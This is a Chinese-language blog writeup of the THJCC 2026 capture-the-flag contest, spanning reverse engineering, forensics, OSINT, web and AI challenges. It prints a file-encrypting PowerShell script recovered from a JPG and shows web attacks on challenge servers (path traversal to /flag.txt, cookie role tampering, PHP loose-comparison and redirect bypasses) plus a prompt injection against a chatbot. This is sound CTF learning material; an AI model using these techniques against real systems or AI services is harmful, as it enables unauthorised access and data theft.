---
title: 2026 THJCC CTF Writeup
date: 2026-02-27 12:34:30
updated: 2026-02-28 22:10:00
tags:
  - crypto
  - web
  - misc
  - forensics
  - AI
  - reverse
  - THJCC
  - CTF
categories:
  - Cyber
  - CTF Writeup
cover: /img/THJCC.png
top_img: /img/THJCC.png
---

# THJCC 2026 writeups
![image](https://hackmd.io/_uploads/SyDs1iC_Wg.png)
![image](https://hackmd.io/_uploads/Hy8BJi0dbx.png)
輕鬆打，學生賽區第23名
## Welcome
### Welcome to THJCC CTF
![image](https://hackmd.io/_uploads/H1oZgj0dbg.png)
誰跟你F12，我瞪眼法求Flag
```
THJCC{We1c0m3-tO-tHjcC-c7F_2O26}
```
## Reverse
### Super baby reverse
![image](https://hackmd.io/_uploads/Sy0pt3ROZx.png)
IDA一開就是了
### Fllllllag_ch3cker_again?
丟進IDA逆向得到這串
```cpp=
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rbx
  __int64 v4; // rax
  char v6; // [rsp+Fh] [rbp-E1h] BYREF
  unsigned __int64 i; // [rsp+10h] [rbp-E0h]
  __int64 v8; // [rsp+18h] [rbp-D8h]
  __int64 v9; // [rsp+20h] [rbp-D0h]
  char *v10; // [rsp+28h] [rbp-C8h]
  _BYTE v11[32]; // [rsp+30h] [rbp-C0h] BYREF
  _BYTE v12[32]; // [rsp+50h] [rbp-A0h] BYREF
  _BYTE v13[33]; // [rsp+70h] [rbp-80h] BYREF
  _QWORD v14[2]; // [rsp+91h] [rbp-5Fh] BYREF
  char v15; // [rsp+A1h] [rbp-4Fh]
  __int16 v16; // [rsp+A2h] [rbp-4Eh]
  int v17; // [rsp+A4h] [rbp-4Ch]
  __int64 v18; // [rsp+A8h] [rbp-48h]
  __int64 v19; // [rsp+B0h] [rbp-40h]
  _WORD v20[5]; // [rsp+B8h] [rbp-38h]
  __int64 v21; // [rsp+C2h] [rbp-2Eh]
  unsigned __int64 v22; // [rsp+D8h] [rbp-18h]

  v22 = __readfsqword(0x28u);
  v15 = 32;
  v16 = 12411;
  v17 = 3295772;
  v18 = 0x62600072F5E0127LL;
  v19 = 0x72A2C022D40475BLL;
  v20[0] = 23809;
  *(_QWORD *)&v20[1] = 0x4355370429703438LL;
  v21 = 0x2261582C00145F36LL;
  v8 = 42;
  strcpy((char *)v14, "Th1s_1s_th3_k3y");
  v9 = 15;
  std::vector<unsigned char>::vector(v11, argv);
  std::vector<unsigned char>::reserve(v11, 42);
  for ( i = 0; i <= 0x29; ++i )
  {
    v6 = *((_BYTE *)&v14[1] + i + 7) ^ *((_BYTE *)v14 + i % 0xF);
    std::vector<unsigned char>::push_back(v11, &v6);
  }
  v10 = &v6;
  v3 = std::vector<unsigned char>::size(v11);
  v4 = std::vector<unsigned char>::data(v11);
  std::string::basic_string(v12, v4, v3, &v6);
  std::__new_allocator<char>::~__new_allocator(&v6);
  std::operator<<<std::char_traits<char>>(&_bss_start, "Please Enter the flag: ");
  std::string::basic_string(v13);
  std::operator>><char>(&std::cin, v13);
  if ( (unsigned __int8)std::operator==<char>(v13, v12) )
    std::operator<<<std::char_traits<char>>(&_bss_start, "Yes\n");
  else
    std::operator<<<std::char_traits<char>>(&_bss_start, "You are wrong\n");
  std::string::~string(v13);
  std::string::~string(v12);
  std::vector<unsigned char>::~vector(v11);
  return 0;
}
```
從第49, 50行可以發現會拿使用者的input(也就是`v13`)去跟`v12`比較，所以這個`v12`應該就是正確的flag。我們有兩種解法：
1. 因為程式跑的時候會生成真正的flag，我們可以用動態分析的方式直接觀察出來
2. 理解程式碼當中flag(`v12`)是怎麼生的，然後寫個程式手動做一次
#### 解法一
使用ltrace去追
![image](https://hackmd.io/_uploads/H1l_1gyFWx.png)
#### 解法二
我們來理解這段程式是怎麼把flag(也就是`v12`的值)求出來的

- STEP1：(第33行)把字串`Th1s_1s_th3_k3y`複製到`v14`

| 變數 | 類別 | 功能 | 數值 |
| -------- | -------- | -------- | -------- |
| v14     | 字串?     | 原始key | Th1s_1s_th3_k3y     |

- **STEP2：(第37~41行) ~~這段程式碼一臉生flag樣嘛~~**
跑一個for迴圈，i從0到0x29，每輪都跑第39行那行XOR運算
> 其中`(_BYTE *)&v14[1] + i + 7`表示的是從`v14`+7開始的連續記憶體
> 也就是v15, v16, ...那些
> 所以我們用python重現生成flag過程時要先把這部分重建出來

把結果暫存在v6，再把他加回vector(v11)

| 變數 | 類別 | 功能 | 數值 |
| -------- | -------- | -------- | -------- |
| v6     | 字串     | 暫存運算結果 | *第39行的運算結果*     |
| v11 | 向量 | 有flag的資訊 |  |

- STEP3：(第43~45行)從`v11`提出flag(`v12`)

| 變數 | 類別 | 功能 | 數值 |
| -------- | -------- | -------- | -------- |
| v12     | 字串     | flag | *flag內容*     |

> 其實我跟vector很不熟w所以我問了ChatGPT第45行到底是什麼概念
> 畢竟這裡又跑出一次v6感覺很怪
![image](https://hackmd.io/_uploads/Sy1Fml1YZl.png)
![image](https://hackmd.io/_uploads/SyXsQgJKZg.png)

~~概念懂了，腳本部分我們交給AI生成~~
```python=
import struct
s = b"Th1s_1s_th3_k3y" + b'\x00' # strcpy 的內容 + null
buf = bytearray(s)

buf += struct.pack("<B", 32) # v15
buf += struct.pack("<h", 12411) # v16
buf += struct.pack("<i", 3295772) # v17
buf += struct.pack("<Q", 0x062600072F5E0127) # v18 (little-endian QWORD)
buf += struct.pack("<Q", 0x72A2C022D40475B) # v19
buf += struct.pack("<H", 23809) # v20[0]
buf += struct.pack("<Q", 0x4355370429703438) # *(_QWORD *)&v20[1]
buf += struct.pack("<Q", 0x2261582C00145F36) # v21
res = bytearray()
for i in range(42):
b1 = buf[i + 15]
b2 = buf[i % 15]
res.append(b1 ^ b2)
print(res.decode())
```



## Misc
### IMAGE?
題目就給一張png檔案，並說Check the hex of this image
直接binwalk找出隱寫的圖片即可
![image](https://hackmd.io/_uploads/BkTcH3Cdbx.png)

### Metro
肉搜題
```
I took this photo at a MRT station in a certain city/county in Taiwan. Please identify which station it is and which floor it was taken on.

Flag format: THJCC{Station Code-Floor} (Case insensitive)

Example: If the station code for Taipei Metro's Shuanglian Station is R12, and the floor is the 1st floor (using American English numbering), the flag would be THJCC{R12-1F}
```

![image](https://upload.cc/i1/2026/02/27/TqhDzr.jpg)
Gemini 3 Pro：
```
Based on the visual clues in your photo, we can pinpoint the exact location and floor.

Location Breakdown
Station Surroundings: The wide-open space, large scooter parking lot, and YouBike 2.0 station indicate a transit hub located in a recently developed or suburban area.

Geographic Clues: The grassy depression with a small stream on the far left is the Kengzi River (坑子溪). The buildings under construction in the background are part of the newly developed Shanbi Rezoning Area (山鼻重劃區).

Distinctive Features: The streetlamps with the distinct pink/magenta curved accents along the pedestrian path are a unique signature of the station plaza located on Jhihnan Road.

These details confirm that this is A10 Shanbi Station on the Taoyuan Airport MRT line.

Floor Level
You took this photo looking down through a set of horizontal louvers (slats). On Taoyuan Airport MRT elevated stations, the concourse and fare gates are typically located on the 2nd floor, while the side platforms are enclosed with these specific weather-shielding louvers on the top level.

Based on the height (roughly 10–12 meters above the street) and the architectural layout of A10 Shanbi Station, you were standing on the 3rd-floor platform looking north.

Your Flag
THJCC{A10-3F}

Would you like me to help identify any other locations from your photos, or provide more information about the Taoyuan Airport MRT system?
```
![1772167595033](https://hackmd.io/_uploads/BkdabjR_bx.gif)

好啦教大家一招是AI不會的，用柱子反光可以看出這是A：也就是桃園機場捷運
> 靈感來自2019年某個用瞳孔肉搜偶像住家的新聞，請各位有技術不要用在錯的地方喔~

![image](https://hackmd.io/_uploads/HJWX4n0uZe.png)
![image](https://hackmd.io/_uploads/HJddz20d-e.png)

### Lock?
![image](https://hackmd.io/_uploads/HJdrpEgYbg.png)
網站進去是這個
![image](https://hackmd.io/_uploads/HkT8pNlF-l.png)
> 一開始還想說這怎麼駭，真是的，Cloudflare的東西駭的得嗎，原來是OSINT啊XD

STEP 1：開發人員資訊
先點Sign in with Google，然後根據提示，在登入頁面點那個網站連結會跳出開發人員資訊
![image](https://hackmd.io/_uploads/rJmW04et-l.png)
把418meow拿去GitHub上搜尋可以找到一個418meow/418meow的repo，裡面有個 README.md
```md
## Hi there 👋
[Flag](https://youtu.be/dQw4w9WgXcQ)
<!--
**m41657557/m41657557** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.

Here are some ideas to get you started:

- 🔭 I’m currently working on ...
- 🌱 I’m currently learning ...
- 👯 I’m looking to collaborate on ...
- 🤔 I’m looking for help with ...
- 💬 Ask me about ...
- 📫 How to reach me: ...
- 😄 Pronouns: ...
- ⚡ Fun fact: ...
-->
```
~~又在釣魚(Rickroll)，啊我還被騙到~~
嗯，比賽當下我就解到這裡，然後查半天一直納悶m41657557/m41657557是什麼。
於是賽後我就去問接續怎麼做
#### 賽後
![image](https://hackmd.io/_uploads/H1cf1rgFbx.png)

STEP 2：git
按照他們說的，git log能找出一個email
![image](https://hackmd.io/_uploads/H1oHJrxtZg.png)

STEP 3：X
把jaylen0721拿去X上搜尋
![image](https://hackmd.io/_uploads/rkQYJHlKZe.png)

STEP 4：Hackmd
他分享的那個連結會導到hackmd官網，所以我又問了，原來是要把他當使用者名稱
於是到 https://hackmd.io/@Jaylen0721

STEP 5：朋友
他的Hackmd上沒任何文章，但有一個追蹤中的人，ID是@wilson2026
此人的Discription那邊有一個連結：https://blog-wilson.pages.dev/ ，是為他的網站。滑到底發現有個DC Server並加入
![image](https://hackmd.io/_uploads/B1C4gSxt-l.png)
![image](https://hackmd.io/_uploads/rycwgHgYbx.png)

看來是要到網址：https://m2k4b3jo8z.pages.dev/
進去便是flag
> Flag：THJCC{42vj6Dx}

~~沒解出這題時我的心情就跟@jaylen0721的X的頭貼一樣~~

## Forensics
*其實我挺喜歡Forensics的*
### Ransomware
![image](https://hackmd.io/_uploads/Hyv58lkFZl.png)
題目給的zip解壓縮，看到flag.txt被加密了(勒索病毒嘛，呼應題目)，而其他.lnk檔案都正常(也挺合理，畢竟誰家勒索病毒要去加密.lnk)，想一想，哪個檔案可能有問題呢？
突然想到去看Uto.jpg的Hex：
![image](https://hackmd.io/_uploads/rkOPvxJYWg.png)
發現一段powershell script藏在最後面！
用dd把他切出來
```bash
dd if=Uto.jpg of=r.ps1 bs=1 skip=$((0x59230))
```
得到ps1腳本內容如下
```ps1=
ErrorActionPreference = 'Stop'

$InputFile  = Join-Path -Path (Get-Location) -ChildPath 'flag.txt'
$OutputFile = "$InputFile.lock"

if (-not (Test-Path -LiteralPath $InputFile -PathType Leaf)) {
  throw "找不到檔案：$InputFile"
}

$UnixTime = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()

# key = MD5( UnixTimeSeconds as UTF-8 string ) -> 16 bytes (AES-128)
$md5 = [System.Security.Cryptography.MD5]::Create()
try {
  $keyMaterial = [Text.Encoding]::UTF8.GetBytes([string]$UnixTime)
  $Key = $md5.ComputeHash($keyMaterial)
} finally {
  $md5.Dispose()
}

# AES-CBC PKCS7
$AES = [System.Security.Cryptography.Aes]::Create()
$AES.Mode    = [System.Security.Cryptography.CipherMode]::CBC
$AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$AES.Key     = $Key
$AES.GenerateIV()

$in  = [IO.File]::OpenRead($InputFile)
$out = [IO.File]::Create($OutputFile)

try {
  $unixBytes = [BitConverter]::GetBytes([int64]$UnixTime)
  $out.Write($unixBytes, 0, $unixBytes.Length)
  $out.Write($AES.IV, 0, $AES.IV.Length)

  $enc = $AES.CreateEncryptor()
  $crypto = New-Object System.Security.Cryptography.CryptoStream(
    $out, $enc, [System.Security.Cryptography.CryptoStreamMode]::Write
  )
  try {
    $in.CopyTo($crypto)
  } finally {
    $crypto.FlushFinalBlock()
    $crypto.Dispose()
  }
}
finally {
  $in.Dispose()
  $out.Dispose()
  $AES.Dispose()
  [Array]::Clear($Key, 0, $Key.Length)
}

Remove-Item -LiteralPath $InputFile -Force

```

所以這個powershell加密腳本在做什麼呢？
~~應該蠻直觀的XD我一個不會powershell的都看得懂了~~
- 程式第10~19行是取出Unix時間戳，並計算它的md5 hash作為AES加密的key
- 第21~26行初始化AES cipher
- 第33、34行是依序將時間戳(可以拿來算出key)、AES-CBC的初始向量寫入輸出檔
- 第36\~39行建立一個加密物件，第41\~45行則讀入flag.txt的內容並加密、寫入輸出檔案
(加密模式：CBC；填充模式：PKCS7 padding)

所以我們的輸出檔案結構如下：

| 部分 | 長度 | 
| -------- | -------- |
| Unix時間戳     | 8bytes     |
| AES IV | 16bytes |
| 加密內容 | 一直到結尾 |

```xxd
00000000: 3a71 5a69 0000 0000 36dd 3b94 e806 2a5f  :qZi....6.;...*_
00000010: eaf3 639d e268 6163 d02e c432 6196 195d  ..c..hac...2a..]
00000020: 4d80 9422 1e94 499a db28 4eb4 e3dc de9e  M.."..I..(N.....
00000030: 4e29 d798 a3be cb70 cae5 3a97 5fbb 2a80  N).....p..:._.*.
00000040: 8913 5ad9 fc4a c557                      ..Z..J.W
```

接著就可以來寫解密程式了
```python=
from hashlib import md5
from Cryptodome.Cipher import AES

def decrypt_lockfile(lock_path):
    with open(lock_path, "rb") as f:
        UnixTime = int.from_bytes(f.read(8), "little", signed=True)
        print(f"UnixTime: {UnixTime}")
        key = md5(str(UnixTime).encode()).digest()  # 16 bytes
        iv = f.read(16)
        ciphertext = f.read()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext_padded = cipher.decrypt(ciphertext)
    print(plaintext_padded[:-plaintext_padded[-1]].decode())

decrypt_lockfile("flag.txt.lock")
```
![image](https://hackmd.io/_uploads/rk5HVUxtZe.png)

### I use arch btw
題目給了一張圖片(Arch Linux 的 Ascii art，看起來是neofetch的截圖之類的？)
遇事不決先binwalk
![image](https://hackmd.io/_uploads/S1dq_xyK-x.png)
得到了一個叫readme.xlsx的檔案，但是有鎖密碼的
理論上我們要用John去brute force，不過這邊我們使用一個黑魔法：
https://www.password-find.com/crack_office_password_nojs.htm
> Flag：THJCC{7h15_15_7h3_m3554g3....._1_u53_4rch_b7w} 


### TV
題目給了一個flac音檔，一聽就是SSTV，題目名稱也暗示(明示?)的很顯然啦~
但用各種線上SSTV Decoder都失敗
錯誤訊息：`Error: Unsupported VIS code: 26`
最後用電腦播音檔，手機上開Robot36 - SSTV Image Decoder側錄才成功。
![64428](https://hackmd.io/_uploads/rysxFhCubx.png)

### ExBaby Shark Master
~~都baby了誰在開Wireshark，不都直接strings嗎~~
![image](https://hackmd.io/_uploads/H10SPh0_-l.png)
(~~但直接找也不難找啊~~)
![image](https://hackmd.io/_uploads/BkxmPnCOWg.png)


## Web
### Las Vegas

![image](https://hackmd.io/_uploads/HkG9l6AdWl.png)
題目給的是一個拉霸機網站
F12簡單觀察可知網站是把拉到的三個數字組合起來然後POST對應網址，於是直接curl
![image](https://hackmd.io/_uploads/rJOilpA_bx.png)
![image](https://hackmd.io/_uploads/BkIpea0dZl.png)
![image](https://hackmd.io/_uploads/SJAfZ60dWe.png)

### Ear👂
題目有給我們一個提示：CWE-698
到OWASP的網站了解一下，這弱點的成因是因為php中沒有寫`exit;`或`die;`，導致即使寫了一行跳轉(還是他應該叫重新定向？)(Redirect)程式會繼續執行，進而我們能讀到網站原先沒有要讓我們看的東西。

題目給的網站進入後會看到以下：
![image](https://hackmd.io/_uploads/HyUl2fetZg.png)
Source Code 給的php部分是一段「是否已登入」的檢驗邏輯，如果沒登入就重新定向到首頁，也就是index.php。

打CTF的直覺告訴我試試 /admin.php
根據題目的提示，我們用curl來避開跳轉
![image](https://hackmd.io/_uploads/Bk6ukXlYWg.png)
紅色部分表示本應跳轉(302)，但因為程式沒有`die;`或`exit;`所以藍色部分照樣被傳了過來。
我們只要把status.php、image.php、system.php都看一次就好，最終在status.php找到
![image](https://hackmd.io/_uploads/BJbbgXlF-x.png)



### My First React
![image](https://hackmd.io/_uploads/BJqrlQlY-l.png)
如果用guest/guest登入只會顯示
![image](https://hackmd.io/_uploads/ByW8lXeF-l.png)
ctrl + u 看原始碼，可以看到引用了 https://chal.thjcc.org:25600/assets/index-rraHEEuN.js
點進去看發現是一串很長的、被高度混淆(Obfuscation)的程式碼。
*(感想就是：這根本不是給人看的吧)*
#### 解法一
沒錯，所以我把整段丟給Gemini 3 Pro，讓他幫我還原出重要部分
```js=
// 當使用者角色為 admin 時觸發
if (role === "admin") {
  try {
    // 1. 取得當前時間的 Timestamp（毫秒），除以 10000 後無條件捨去
    // 這意味著這個數字每 10 秒會改變一次
    let seed = Math.floor(Date.now() / 10000); 

    // 2. 將這個數字轉換為字串，並計算 SHA-1 雜湊值
    const hash = await async function(text) {
      const encoder = new TextEncoder().encode(text);
      const digest = await crypto.subtle.digest("SHA-1", encoder);
      return Array.from(new Uint8Array(digest))
        .map(b => b.toString(16).padStart(2, "0"))
        .join("");
    }("" + seed);

    // 3. 直接向這個 SHA-1 雜湊值發送 GET 請求
    const response = await fetch(hash);
    if (!response.ok) throw new Error("HTTP error! status: " + response.status);
    
    // 4. 解析回傳的 JSON 並顯示出來 (這裡就是 Flag)
    const data = await response.json();
    setResult(data.result); 

  } catch(err) {
    setResult("Something went wrong.");
  }
} else {
  // 如果不是 admin，只會顯示這句話
  setResult("Wasn't it a nice day?");
}
```
發現我們其實可以不用是admin，而直接手動計算flag位置(上面步驟1, 2)並發送GET請求(上面步驟4)。AI也順便幫我把程式寫好了。
```python=
import time
import hashlib
import requests

target_url = "https://chal.thjcc.org:25600"

# 計算與前端相同的時間種子 (毫秒 / 10000)
# Python 的 time.time() 回傳秒數，因此乘以 1000 轉毫秒
seed = str(int((time.time() * 1000) / 10000))

# 計算 SHA-1
sha1_hash = hashlib.sha1(seed.encode('utf-8')).hexdigest()

print(f"[*] Timestamp seed: {seed}")
print(f"[*] Target path: /{sha1_hash}")

# 發送請求獲取 Flag
response = requests.get(f"{target_url}/{sha1_hash}")
print(f"[+] Response: {response.text}")
```
執行完就有
> Flag：THJCC{CSR_c4n_b3_d4ng3rrr0us!}

#### 解法二
後來我去翻Discord Server別人的方法，說是可以直接Edit Respond???
![image](https://hackmd.io/_uploads/HyjVjEgtbe.png)
![image](https://hackmd.io/_uploads/ByN8iNxFbe.png)
~~我到今天才知道原來Burp還有這個功能喔~~

特別去查了一下，作法如下：
開Intercept，然後Login，這時會攔截到一個封包：
![image](https://hackmd.io/_uploads/S1U-nEeKZl.png)
在Request部分右鍵，Do intercept --> Response to this request
![image](https://hackmd.io/_uploads/SktXnEltZg.png)
這樣Forward後就會也攔截Server給我們的Respond，並且可以修改(把role的guest修改成admin，如下圖)
![image](https://hackmd.io/_uploads/H199hEgK-x.png)
再Forward即可
![image](https://hackmd.io/_uploads/B1bA3EgtZg.png)



### A long time ago...
![image](https://hackmd.io/_uploads/rk_G5lyY-l.png)
題目給的是一個網站，以及他的原始碼。可以簡單猜出(或從原始碼看出)我們要以admin登入才能拿到flag

如果直接用admin登入會報錯：
Admin login is permanently disabled.

所以我們要想其他方法。
以下分別是登入頁面與Dashboard的判斷邏輯：
```php=
<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $_SESSION['perms'] = [];

    if ($_POST['username'] === 'admin') {
        die("Admin login is permanently disabled.");
    }

    $perm_key = $_POST['username'];
    $_SESSION['perms'][$perm_key] = 'guest_access';

    $_SESSION['username'] = $_POST['username'];
    header('location: /index.php');
    die();
}
```
```php=
<?php
session_start();

$flag = "THJCC{FAKE_FLAG}";

if(!isset($_SESSION['username'])){
    header('location: /login.php');
}

$is_admin = false;
if (isset($_SESSION['perms'])) {
    foreach ($_SESSION['perms'] as $key => $value) {
        if ($key == 'admin') { 
            $is_admin = true;
            break;
        }
    }
}

$username_display = htmlspecialchars($_SESSION['username']);

```
注意到在登入介面用的比較(上面程式碼第17行)是強比較(\=\==)，Dashboard用的(下面程式碼第13行)是弱比較(==)，即不比較型別，只比較轉換後的數值。又非數字開頭的字串轉換後為0，因此有
```php
0 == "admin"
```
所以我們在Username輸入「0」即可
![image](https://hackmd.io/_uploads/ByX8hgkFbe.png)


### Secret File Viewer
![image](https://hackmd.io/_uploads/r1P-xxeFbx.png)
把A, B, C檔案都下載下來
A, B, C三個按鈕的連結分別是
```
http://chal.thjcc.org:30000/download.php?file=files/file_A.txt
http://chal.thjcc.org:30000/download.php?file=files/file_B.txt
http://chal.thjcc.org:30000/download.php?file=files/file_C.txt
```
可以猜出下載檔案的方式是訪問`http://chal.thjcc.org:30000/download.php?file=檔案位置`
以下為A, B, C的內容
- A
```
From: Agent K
To: Agent Q
Subject: Web Interface Review

Q,

I’ve taken a look at the new web interface you deployed last night.
The functionality seems fine, but I’m concerned about how files are being handled.

Exposing file paths through user-controllable parameters is always risky.
You know how creative outsiders can be when they start poking around.

Please make sure the client-side logic is solid and add some extra
security measures before this goes any further.

We cannot afford careless mistakes this time.

— K
```
- B
```
From: Agent Q
To: Agent K
Subject: Re: Web Interface Review

K,

No need to worry.

I’ve already implemented additional client-side protections.
There is a dedicated script, "script.js" validates file paths, blocks traversal
patterns, and ensures only approved resources can be accessed.

The logic is a bit complex, but that’s intentional.
Anyone trying to tamper with the system will be stopped before reaching
anything sensitive.

I can personally guarantee that the interface is secure now.

You have my word.

— Q
```
- C
```
From: Agent K
To: Agent Q
Subject: Re: Re: Web Interface Review

Good to hear.

As long as the safeguards are in place, we should be fine.
Just remember — under no circumstances should sensitive files be exposed.

This includes internal configurations, shared libraries,
and especially the flag file.

If anything like /flag.txt or other critical assets were ever leaked,
the consequences would be severe.

Let’s hope your precautions are as effective as you claim.

— K
```
從B可得知他似乎有做防護(script.js)…嗎？
我們訪問 http://chal.thjcc.org:30000/script.js 得到script.js的內容如下
```js=
(function () {
    "use strict";

    // ====== string table ======
    const _0x5a3d = [
        "log",
        "warn",
        "error",
        "Security check passed",
        "Invalid file path detected",
        "Loading file",
        "obfuscation.php",
        "file",
        "..",
        "/",
        "%2e%2e",
        "base64",
        "atob",
        "btoa"
    ];

    function _0x1c9a(i) {
        return _0x5a3d[i];
    }

    // ====== security module ======
    const SecurityModule = (function () {
        let state = {
            validated: false,
            token: null,
            timestamp: Date.now()
        };

        function generateToken() {
            const raw = Math.random().toString(36).substring(2);
            return window[_0x1c9a(12)](raw);
        }

        function validatePath(path) {
            if (!path) return false;

            // LFI detection
            if (
                path.includes(_0x1c9a(8)) ||
                path.includes(_0x1c9a(10)) ||
                path.split(_0x1c9a(9)).length > 10
            ) {
                console[_0x1c9a(1)](_0x1c9a(4));
                return false;
            }

            return true;
        }

        function init() {
            state.token = generateToken();
            state.validated = true;
            console[_0x1c9a(0)](_0x1c9a(3));
        }

        return {
            init,
            validatePath,
            state
        };
    })();

    // ====== loader ======
    function loadFileSecurely(file) {
        console[_0x1c9a(0)](_0x1c9a(5), file);

        if (!SecurityModule.validatePath(file)) {
            console[_0x1c9a(2)]("Blocked by client-side filter");
            return;
        }

        // request construction
        const fakeUrl =
            _0x1c9a(6) +
            "?" +
            _0x1c9a(7) +
            "=" +
            encodeURIComponent(file);

        void fakeUrl;
    }

    function entropyNoise() {
        let x = 0;
        for (let i = 0; i < 1000; i++) {
            x ^= Math.random() * i;
        }
        return x;
    }

    entropyNoise();

    // ====== Init ======
    document.addEventListener("DOMContentLoaded", function () {
        SecurityModule.init();

        // Pretend to protect buttons
        const buttons = document.querySelectorAll("a.btn");
        buttons.forEach(btn => {
            btn.addEventListener("mouseover", function () {
                const href = btn.getAttribute("href") || "";
                loadFileSecurely(href);
            });
        });
    });

})();
```
我們可以看到這段程式只是在前端執行並在console輸出一些東西，好像做些神奇操作在生token但也沒丟給後端比對什麼的，就只是安慰劑而已，所以我們可以直接忽略他。

訪問
```
http://chal.thjcc.org:30000/download.php?file=/flag.txt
```
即可得到flag.txt
> Flag：THJCC{h0w_dID_y0u_br34k_q'5_pr073c710n???}

### 0422
題目描述：
```
A very simple challenge about a web exploit.

Really simple. LOL.
```
![image](https://hackmd.io/_uploads/HyGcMa0OZe.png)
先隨便輸入個guest/guest試試看
![image](https://hackmd.io/_uploads/r1WAGpAObg.png)
觀察cookies，猜網站是靠role的值來判斷的，將其改成admin再重新載入
![image](https://hackmd.io/_uploads/ryuJma0dZg.png)
![image](https://hackmd.io/_uploads/BJ9XXp0_be.png)
成功！

> 也可以用Burp，把登入的封包攔截，從更早修改cookies

## AI
### Chat
題目：
```
這是新來的 THJCC 客服機器人，但他好像有一些「祕密」……
This is the new THJCC customer service bot... but it seems like he’s hiding a little "secret"
```
那個AI客服機器人：https://chatgpt.com/g/g-6995a0b1103481918fb8d886fed7f0e0-thjcc-chat
我在這個影片中找到一個神奇payload並且成功了：[Top 5 WTF Prompt Injections - YouTube](https://youtu.be/-1uMpQo7XGU)
![image](https://hackmd.io/_uploads/Skgxij2Rdbl.png)
